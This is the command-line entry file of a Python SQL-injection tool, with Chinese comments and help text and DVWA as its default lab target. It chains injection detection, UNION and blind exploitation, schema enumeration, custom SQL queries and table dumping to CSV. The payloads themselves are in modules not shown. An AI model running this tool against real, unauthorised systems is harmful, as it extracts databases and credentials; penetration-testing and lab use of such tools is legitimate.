"""命令行入口。

用法示例：
    python main.py
    python main.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#"
    python main.py --cookie "PHPSESSID=xxx; security=low" -p id --dump
"""

from __future__ import annotations

import argparse
import io
import sys

from sqli_tool.blind import BlindExtractor, ValueReader
from sqli_tool.config import DEFAULT_COOKIE, DEFAULT_DELAY, DEFAULT_TARGET_URL, DUMP_LIMIT
from sqli_tool.detector import Detector
from sqli_tool.dumper import Dumper
from sqli_tool.enumerator import Enumerator
from sqli_tool.errors import NotExploitable, TargetUnreachable, ToolError
from sqli_tool.exploiter import Exploiter
from sqli_tool.http_client import HttpClient
from sqli_tool.report import Report
from sqli_tool.target import Target
from sqli_tool.utils import color, error, info, print_table, set_ansi, success, warn


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="sqli_tool",
        description="GET 参数 SQL 注入检测与利用工具（仅用于授权测试）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例：\n"
            "  python main.py                       # 使用内置默认目标\n"
            "  python main.py -u <URL> -p id        # 指定目标与参数\n"
            "  python main.py --dump --db dvwa --table users\n"
        ),
    )
    parser.add_argument("-u", "--url", default=DEFAULT_TARGET_URL, help="目标 URL（可含多个 GET 参数）")
    parser.add_argument("-p", "--param", help="指定注入参数；省略则自动挑选")
    parser.add_argument("-c", "--cookie", default=DEFAULT_COOKIE, help="Cookie 字符串，默认使用内置 DVWA 会话")
    parser.add_argument("--timeout", type=float, default=15.0, help="单请求超时秒数")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="时间盲注 SLEEP 秒数")
    parser.add_argument("--proxy", help="HTTP 代理，如 http://127.0.0.1:8080")
    parser.add_argument("--insecure", action="store_true", help="跳过 TLS 证书校验")
    parser.add_argument("--no-color", action="store_true", help="关闭彩色输出")

    group = parser.add_argument_group("利用选项（确认注入后生效）")
    group.add_argument("--enumerate", action="store_true", help="枚举数据库/表/列/字段信息")
    group.add_argument("--all-databases", action="store_true", help="枚举所有非系统库（默认只枚举当前库）")
    group.add_argument("--include-system", action="store_true", help="库列表中包含 information_schema 等系统库")
    group.add_argument("--deep-system", action="store_true", help="连系统库的表也展开字段详情（很慢）")
    group.add_argument("--db", help="目标数据库名（默认当前库）")
    group.add_argument("--table", help="要导出的表名")
    group.add_argument("--columns", help="导出列，逗号分隔；默认使用枚举到的全部列")
    group.add_argument("--dump", action="store_true", help="导出表数据")
    group.add_argument("--limit", type=int, default=DUMP_LIMIT, help="导出行数上限")
    group.add_argument("--query", help="自定义 SQL 表达式，如 @@version")
    group.add_argument("--force-blind", action="store_true", help="强制使用盲注通道（跳过 UNION）")
    group.add_argument("--outdir", default="reports", help="报告输出目录")
    group.add_argument("--no-report", action="store_true", help="不生成报告文件")
    return parser


def _configure_stdio() -> None:
    """Windows 控制台默认 GBK，统一改成 UTF-8 避免中文乱码。"""
    for stream in (sys.stdout, sys.stderr):
        reconfigure = getattr(stream, "reconfigure", None)
        if reconfigure:
            try:
                reconfigure(encoding="utf-8", errors="replace")
            except (ValueError, io.UnsupportedOperation):
                pass


def schema_to_dict(schema) -> dict:
    """把 Schema 转成可 JSON 序列化的嵌套字典。"""
    return {
        db: {
            table.name: {
                "engine": table.engine,
                "rows": table.rows,
                "columns": [
                    {
                        "name": col.name,
                        "type": col.type,
                        "nullable": col.nullable,
                        "key": col.key,
                        "default": col.default,
                        "extra": col.extra,
                        "comment": col.comment,
                    }
                    for col in table.columns
                ],
            }
            for table in tables
        }
        for db, tables in schema.tables.items()
    }


def print_schema(schema) -> None:
    """在终端展示库列表与 库 → 表 → 列（类型/可空/键/默认值/备注）。"""
    print()
    print(color("库列表", "bold"))
    rows = []
    for db in schema.databases:
        note = "当前库" if db == schema.current_database else ""
        if db in schema.tables:
            note = (note + "，" if note else "") + f"已枚举 {len(schema.tables[db])} 张表"
        rows.append((db, note))
    if schema.current_database and schema.current_database not in schema.databases:
        rows.append((schema.current_database, "当前库（未在列表中出现）"))
    print_table(["数据库", "说明"], rows, max_width=40)
    if not schema.tables:
        warn("未枚举到任何表")
        return
    for db, tables in schema.tables.items():
        print()
        print(color(f"数据库：{db}", "bold"))
        if not tables:
            warn("  （无表或无权限）")
            continue
        for table in tables:
            meta = "  ".join(part for part in (
                f"引擎={table.engine}" if table.engine else "",
                f"行数={table.rows}" if table.rows else "",
            ) if part)
            print(color(f"  表：{table.name}", "cyan") + (f"  [{meta}]" if meta else ""))
            rows = []
            for col in table.columns:
                detail = col.type or "-"
                flags = []
                if col.nullable and col.nullable.upper() == "NO":
                    flags.append("NOT NULL")
                if col.key:
                    flags.append(f"KEY:{col.key}")
                if col.extra:
                    flags.append(col.extra)
                if col.default and col.default != "NULL":
                    flags.append(f"默认={col.default}")
                if col.comment:
                    flags.append(f"备注={col.comment}")
                rows.append([col.name, detail, "，".join(flags)])
            print_table(["列名", "类型", "属性"], rows, max_width=48)


def main(argv: list[str] | None = None) -> int:
    _configure_stdio()
    args = build_parser().parse_args(argv)
    set_ansi(not args.no_color)

    print(color("=" * 64, "magenta"))
    print(color("  SQL 注入检测工具 · 仅限授权目标", "bold"))
    print(color("=" * 64, "magenta"))

    target = Target.parse(args.url)
    info(f"目标：{target.base_url}")
    info(f"参数：{', '.join(name for name, _ in target.params) or '（无）'}")
    if not target.params:
        error("目标 URL 不含 GET 参数，无法测试")
        return 2

    client = HttpClient(
        cookie=args.cookie,
        timeout=args.timeout,
        verify_tls=not args.insecure,
        proxy=args.proxy,
    )
    report = Report(target_url=args.url, cookie=args.cookie)

    try:
        # ---------- 第 1 步：连通性 ----------
        info("检查目标可达性…")
        probe = client.get(target.original_url())
        if probe.status >= 500:
            warn(f"目标返回 HTTP {probe.status}")
        elif probe.status >= 400:
            warn(f"目标返回 HTTP {probe.status}，请检查 Cookie 是否失效")
        else:
            success(f"目标可达（HTTP {probe.status}，{probe.length} 字节，{probe.elapsed:.2f}s）")
        if "login.php" in probe.url or "login" in probe.text.lower()[:2000]:
            warn("响应疑似登录页，Cookie 可能已失效；仍将继续测试")
        report.add_step("连通性检查", f"HTTP {probe.status}")

        # ---------- 第 2 步：注入检测 ----------
        info("开始注入检测…")
        detector = Detector(client, target, delay=args.delay)
        injection = detector.scan([args.param] if args.param else None)
        report.mark_vulnerable()
        report.set_finding("注入参数", injection.param)
        report.set_finding("检测手法", injection.technique)
        report.set_finding("闭合引号", injection.quote or "无")
        report.add_step("注入检测", "；".join(injection.evidence))

        # ---------- 第 3 步：利用 ----------
        info("确认注入，进入利用阶段…")
        exploiter = Exploiter(client, target, injection)
        blind = None
        dbms = ""
        if args.force_blind:
            blind = BlindExtractor(client, target, injection, delay=args.delay)
            report.add_step("盲注通道", f"模式={blind.mode}（用户指定）")
            warn("已强制使用盲注通道，未做 UNION 探测")
        else:
            try:
                exploiter.find_columns()
                exploiter.find_display_columns()
                dbms = exploiter.fingerprint().get("dbms", "")
                report.set_finding("数据库类型", dbms or "未知")
            except (NotExploitable, TargetUnreachable) as exc:
                warn(f"UNION 通道不可用：{exc}")
                blind = BlindExtractor(client, target, injection, delay=args.delay)
                report.add_step("盲注通道", f"模式={blind.mode}")

        reader = ValueReader(exploiter, blind, dbms=dbms, prefer_union=not args.force_blind)

        if args.query:
            info(f"执行表达式：{args.query}")
            value = reader.read(f"({args.query})")
            print_table(["表达式", "结果"], [(args.query, value)], max_width=80)
            report.set_finding("自定义查询", {args.query: value})

        if args.enumerate:
            enumerator = Enumerator(reader, dbms or "MySQL", deep_system=args.deep_system)
            schema = enumerator.schema(
                database=args.db,
                all_databases=args.all_databases,
                include_system=args.include_system,
            )
            print_schema(schema)
            report.set_finding("当前数据库", schema.current_database or "未知")
            report.set_finding("数据库列表", schema.databases)
            report.set_finding("表结构", schema_to_dict(schema))

        if args.dump:
            if not args.table:
                error("使用 --dump 时必须指定 --table")
                return 2
            enumerator = Enumerator(reader, dbms or "MySQL")
            database = args.db or reader.read("(SELECT DATABASE())").strip()
            if not database:
                error("无法确定数据库名，请用 --db 指定")
                return 2
            columns = (
                [c.strip() for c in args.columns.split(",") if c.strip()]
                if args.columns
                else enumerator.columns(database, args.table)
            )
            dumper = Dumper(reader, dbms or "MySQL")
            result = dumper.dump(database, args.table, columns, limit=args.limit)
            if result.rows:
                print_table(result.columns, result.rows)
                csv_path = result.to_csv(f"{args.outdir}/{database}_{args.table}.csv")
                success(f"CSV 已保存：{csv_path}")
            report.set_finding("导出", {
                "database": database,
                "table": args.table,
                "columns": result.columns,
                "rows": len(result.rows),
            })

        report.show_findings()
        if not args.no_report:
            report.save_json(args.outdir)
            report.save_markdown(args.outdir)
        print()
        success("测试完成：目标存在 SQL 注入漏洞")
        return 0

    except NotExploitable as exc:
        error(f"未发现 SQL 注入：{exc}")
        if not args.no_report:
            report.save_json(args.outdir)
        return 1
    except TargetUnreachable as exc:
        error(str(exc))
        return 2
    except ToolError as exc:
        error(str(exc))
        return 1
    except KeyboardInterrupt:
        warn("用户中断")
        return 130


if __name__ == "__main__":
    sys.exit(main())
